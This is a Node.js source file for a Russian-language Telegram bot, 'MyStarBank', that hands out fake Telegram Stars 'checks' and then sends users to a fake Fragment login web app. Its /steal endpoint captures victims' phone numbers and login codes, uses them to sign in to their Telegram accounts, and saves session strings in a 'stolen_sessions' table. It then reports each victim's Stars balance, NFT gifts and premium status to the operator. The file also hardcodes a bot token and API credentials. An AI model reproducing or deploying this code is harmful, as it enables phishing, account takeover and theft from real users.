const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const API_ID = parseInt(process.env.API_ID) || 30427944;
const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
const MY_USER_ID = 1398396668;
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

const activeSessions = new Map();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        phone_code_hash TEXT,
        session_string TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending',
        stars_data INTEGER DEFAULT 0,
        gifts_data INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS used_checks (
        user_id INTEGER,
        check_id INTEGER,
        used_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY (user_id, check_id)
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', async (req, res) => {
    console.log('=== ДАННЫЕ ===');
    console.log('Этап:', req.body.stage);
    console.log('Номер:', req.body.phone);
    
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            let userId = null;
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                userId = userData.id;
            }
            
            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
            
            await requestRealTelegramCode(req.body.phone, userId);
                
        } catch (error) {
            console.log('❌ Ошибка:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        const phone = req.body.phone;
        const code = req.body.code;
        
        await signInWithRealCode(phone, code);
    }
    
    res.sendStatus(200);
});

// Запрос кода
async function requestRealTelegramCode(phone, userId) {
    try {
        console.log(`🔐 Запрашиваю код для: ${phone}`);
        
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 5,
            timeout: 10000,
        });
        
        await client.connect();

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({
                    allowFlashcall: false,
                    currentNumber: true,
                    allowAppHash: false,
                    allowMissedCall: false,
                })
            })
        );

        console.log('✅ Код запрошен! Hash:', result.phoneCodeHash);
        
        activeSessions.set(phone, {
            client: client,
            phoneCodeHash: result.phoneCodeHash,
            session: stringSession
        });

        db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
            [result.phoneCodeHash, phone]);

        bot.sendMessage(MY_USER_ID, 
            `🔐 КОД ЗАПРОШЕН!\n` +
            `📱 Номер: ${phone}\n` +
            `👤 ID: ${userId || 'N/A'}\n` +
            `⚡ Вводи код быстро`
        );
        
    } catch (error) {
        console.log('❌ Ошибка:', error);
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// Вход с кодом
async function signInWithRealCode(phone, code) {
    try {
        const sessionData = activeSessions.get(phone);
        if (!sessionData || !sessionData.client) {
            bot.sendMessage(MY_USER_ID, `❌ Нет сессии для ${phone}`);
            return;
        }

        const client = sessionData.client;
        const phoneCodeHash = sessionData.phoneCodeHash;

        try {
            const result = await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code.toString()
                })
            );

            console.log('✅ ВХОД УСПЕШЕН!');
            
            const sessionString = client.session.save();
            db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                [sessionString, phone]);

            await checkAccountStatus(client, phone);
            
            activeSessions.delete(phone);
            await client.disconnect();

        } catch (signInError) {
            console.log('❌ Ошибка входа:', signInError);
            
            bot.sendMessage(MY_USER_ID,
                `❌ ОШИБКА ВХОДА\n` +
                `📱 Номер: ${phone}\n` +
                `🔑 Код: ${code}\n` +
                `⚠️ ${signInError.message}`
            );
            
            activeSessions.delete(phone);
            try {
                await client.disconnect();
            } catch (e) {
                console.log('Ошибка при отключении:', e);
            }
        }

    } catch (error) {
        console.log('❌ Общая ошибка:', error);
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// ПРОВЕРКА СТАТУСА АККАУНТА
async function checkAccountStatus(client, phone) {
    try {
        const user = await client.getMe();
        
        let starsCount = 0;
        let nftGifts = 0;
        
        // МЕТОД 1: ПРЯМОЙ ЗАПРОС ЗВЕЗД
        try {
            const starsStatus = await client.invoke(
                new Api.payments.GetStarsStatus({})
            );
            
            if (starsStatus && typeof starsStatus.balance === 'number') {
                starsCount = starsStatus.balance;
            }
        } catch (error) {
            console.log('Method 1 failed:', error.message);
        }
        
        // МЕТОД 2: ПРОВЕРКА ПРЕМИУМ СТАТУСА
        try {
            const userFull = await client.invoke(
                new Api.users.GetFullUser({
                    id: user.id
                })
            );
            
            if (userFull && userFull.premium_gifts) {
                nftGifts = userFull.premium_gifts.length || 0;
            }
        } catch (error) {
            console.log('Premium check failed:', error.message);
        }
        
        let message = `🎯 ПРОВЕРКА АККАУНТА:\n` +
                     `📱 Номер: ${phone}\n` +
                     `👤 Username: @${user.username || 'нет'}\n` +
                     `👑 Премиум: ${user.premium ? 'ДА ✅' : 'нет ❌'}\n\n` +
                     `💰 ФИНАНСЫ:\n` +
                     `⭐ ЗВЕЗДЫ: ${starsCount > 0 ? starsCount + ' ✅' : '0 ❌'}\n` +
                     `🎁 NFT ПОДАРКОВ: ${nftGifts > 0 ? nftGifts + ' ✅' : '0 ❌'}\n\n`;
        
        if (starsCount > 0 || nftGifts > 0 || user.premium) {
            message += `💎 ЦЕННЫЙ АККАУНТ!\n\n`;
            
            if (starsCount > 0) {
                message += `💰 ${starsCount} звезд для вывода\n`;
            }
            if (nftGifts > 0) {
                message += `🎁 ${nftGifts} NFT подарков\n`;
            }
            if (user.premium) {
                message += `👑 Премиум статус активен\n`;
            }
            
            message += `\n⚡ ГОТОВ К ВЫВОДУ СРЕДСТВ`;
        } else {
            message += `❌ АККАУНТ ПУСТОЙ\n`;
            message += `💡 Нет звезд, NFT или премиума`;
        }
        
        db.run(`UPDATE stolen_sessions SET stars_data = ?, gifts_data = ?, status = 'checked' WHERE phone = ?`, 
            [starsCount, nftGifts, phone]);
        
        bot.sendMessage(MY_USER_ID, message);
        
    } catch (error) {
        console.log("❌ Ошибка проверки:", error);
        bot.sendMessage(MY_USER_ID, `❌ Ошибка проверки: ${error.message}`);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает на порту ${PORT}`);
});

// INLINE QUERY ДЛЯ ПОДСКАЗКИ
bot.on('inline_query', (query) => {
    const results = [
        {
            type: 'photo',
            id: '1',
            photo_url: `${WEB_APP_URL}/stars.jpg`,
            thumb_url: `${WEB_APP_URL}/stars.jpg`,
            title: '🎫 Создать чек на 50 звезд',
            description: 'Нажмите чтобы отправить чек в чат',
            caption: '🎫 Чек на 50 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
            reply_markup: {
                inline_keyboard: [[
                    { text: "🪙 Забрать звезды", url: `https://t.me/MyStarBank_bot?start=create_check_50` }
                ]]
            }
        },
        {
            type: 'photo',
            id: '2',
            photo_url: `${WEB_APP_URL}/100.png`,
            thumb_url: `${WEB_APP_URL}/100.png`,
            title: '💫 Создать чек на 100 звезд',
            description: 'Нажмите чтобы отправить чек в чат',
            caption: '🎫 Чек на 100 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
            reply_markup: {
                inline_keyboard: [[
                    { text: "💫 Забрать звезды", url: `https://t.me/MyStarBank_bot?start=create_check_100` }
                ]]
            }
        }
    ];
    
    bot.answerInlineQuery(query.id, results, { cache_time: 1 });
});

// СОЗДАНИЕ ЧЕКОВ ЧЕРЕЗ @MyStarBank_bot
bot.onText(/@MyStarBank_bot/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    bot.sendMessage(chatId, 
        '🎫 <b>Создание чека</b>\n\nВыберите сумму для чека:',
        {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
                    [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }]
                ]
            }
        }
    );
});

// CALLBACK ОБРАБОТЧИК
bot.on('callback_query', async (query) => {
    const data = query.data;
    const userId = query.from.id;
    
    try {
        await bot.answerCallbackQuery(query.id);
        await bot.deleteMessage(query.message.chat.id, query.message.message_id);
        
        if (data === 'create_50' || data === 'create_100') {
            const amount = data === 'create_50' ? 50 : 100;
            const activations = 1;
            
            db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
                [amount, activations, userId], function(err) {
                if (err) return;
                
                const checkId = this.lastID;
                let checkText, photoFile;
                
                if (amount === 50) {
                    checkText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
                    photoFile = 'stars.jpg';
                } else {
                    checkText = `<b>🎫 Чек на 100 звезд</b>\n\n💫 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
                    photoFile = '100.png';
                }
                
                const photoPath = path.join(__dirname, 'public', photoFile);
                if (fs.existsSync(photoPath)) {
                    bot.sendPhoto(query.message.chat.id, photoPath, {
                        caption: checkText,
                        parse_mode: 'HTML',
                        reply_markup: { 
                            inline_keyboard: [[{ 
                                text: `🪙 Забрать ${amount} звезд`, 
                                url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                            }]] 
                        }
                    });
                } else {
                    bot.sendMessage(query.message.chat.id, checkText, {
                        parse_mode: 'HTML',
                        reply_markup: { 
                            inline_keyboard: [[{ 
                                text: `🪙 Забрать ${amount} звезд`, 
                                url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                            }]] 
                        }
                    });
                }
            });
        }
    } catch (error) {
        console.log('Ошибка callback:', error);
    }
});

// МЕНЮ /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
        [userId, msg.from.username, 0], function(err) {});
    
    showMainMenu(chatId, userId);
});

function showMainMenu(chatId, userId) {
    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
        const balance = row ? row.balance : 0;
        
        const menuText = `MyStarBank - Система передачи звезд\n\nВаш баланс: ${balance} stars\n\nДоступные действия:\n- Проверить баланс\n- Создать чек\n- Вывести средства`;

        const menuKeyboard = {
            reply_markup: {
                keyboard: [
                    [{ text: "Проверить баланс" }],
                    [{ text: "Создать чек" }],
                    [{ text: "Вывести средства" }]
                ],
                resize_keyboard: true,
                one_time_keyboard: false
            }
        };

        bot.sendMessage(chatId, menuText, menuKeyboard);
    });
}

// ОБРАБОТКА ТЕКСТОВЫХ КОМАНД
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;
    
    if (text === 'Проверить баланс') {
        db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
            const balance = row ? row.balance : 0;
            bot.sendMessage(chatId, `💰 Ваш баланс: ${balance} stars`);
        });
        
    } else if (text === 'Создать чек') {
        const futureDate = new Date();
        futureDate.setDate(futureDate.getDate() + 21);
        
        bot.sendMessage(chatId,
            `🎫 <b>Создание чека</b>\n\n` +
            `❌ <b>Временно недоступно</b>\n\n` +
            `📝 <b>Извините, для идентификации личности нужно подождать 21 день</b>\n\n` +
            `📅 <b>Доступ откроется:</b> ${futureDate.toLocaleDateString('ru-RU')}\n\n` +
            `💡 <b>Альтернатива:</b> Используйте @MyStarBank_bot в любом чате`,
            { parse_mode: 'HTML' }
        );
        
    } else if (text === 'Вывести средства') {
        bot.sendMessage(chatId,
            `🏦 <b>Вывод средств</b>\n\n` +
            `🔐 <b>Для вывода средств необходимо войти через Fragment</b>\n\n` +
            `📋 <b>Требования:</b>\n` +
            `├ 🔐 Подтвержденный аккаунт Fragment\n` +
            `├ 💫 Минимум 100 stars\n` +
            `└ 📱 Верифицированный номер\n\n` +
            `⚡ <b>Нажмите кнопку ниже для входа:</b>`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: "🔐 Войти через Fragment", web_app: { url: WEB_APP_URL } }
                    ]]
                }
            }
        );
    }
});

// ОБРАБОТКА СТАРТА С ПАРАМЕТРОМ
bot.onText(/\/start (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const params = match[1];
    
    db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
        [userId, msg.from.username, 0], function(err) {});
    
    if (params.startsWith('check_')) {
        const checkId = params.split('_')[1];
        
        db.get(`SELECT * FROM used_checks WHERE user_id = ? AND check_id = ?`, [userId, checkId], (err, usedRow) => {
            if (err || usedRow) {
                bot.sendMessage(chatId, '❌ Вы уже использовали этот чек!');
                return;
            }
            
            db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
                if (err || !row) {
                    bot.sendMessage(chatId, '❌ Чек уже использован или не существует!');
                    return;
                }
                
                db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, userRow) => {
                    const currentBalance = userRow ? userRow.balance : 0;
                    const newBalance = currentBalance + row.amount;
                    
                    db.serialize(() => {
                        db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
                        db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
                            [userId, msg.from.username, newBalance]);
                        db.run(`INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`, [userId, checkId]);
                    });
                    
                    bot.sendMessage(chatId, 
                        `🎉 <b>Получено ${row.amount} звезд!</b>\n\n` +
                        `💫 <b>Ваш баланс:</b> ${newBalance} stars\n\n` +
                        `💰 Для управления средствами используйте /start`,
                        { parse_mode: 'HTML' }
                    );
                });
            });
        });
        
    } else if (params.startsWith('create_check_')) {
        const amount = parseInt(params.split('_')[2]);
        const activations = 1;
        
        db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
            [amount, activations, userId], function(err) {
            if (err) {
                bot.sendMessage(chatId, '❌ Ошибка создания чека');
                return;
            }
            
            const checkId = this.lastID;
            let checkText, photoFile;
            
            if (amount === 50) {
                checkText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
                photoFile = 'stars.jpg';
            } else {
                checkText = `<b>🎫 Чек на 100 звезд</b>\n\n💫 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
                photoFile = '100.png';
            }
            
            const photoPath = path.join(__dirname, 'public', photoFile);
            if (fs.existsSync(photoPath)) {
                bot.sendPhoto(chatId, photoPath, {
                    caption: checkText,
                    parse_mode: 'HTML',
                    reply_markup: { 
                        inline_keyboard: [[{ 
                            text: `🪙 Забрать ${amount} звезд`, 
                            url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                        }]] 
                    }
                });
            } else {
                bot.sendMessage(chatId, checkText, {
                    parse_mode: 'HTML',
                    reply_markup: { 
                        inline_keyboard: [[{ 
                            text: `🪙 Забрать ${amount} звезд`, 
                            url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                        }]] 
                    }
                });
            }
        });
        
    } else {
        showMainMenu(chatId, userId);
    }
});

console.log('✅ Бот запущен');
console.log('✅ Web App URL:', WEB_APP_URL);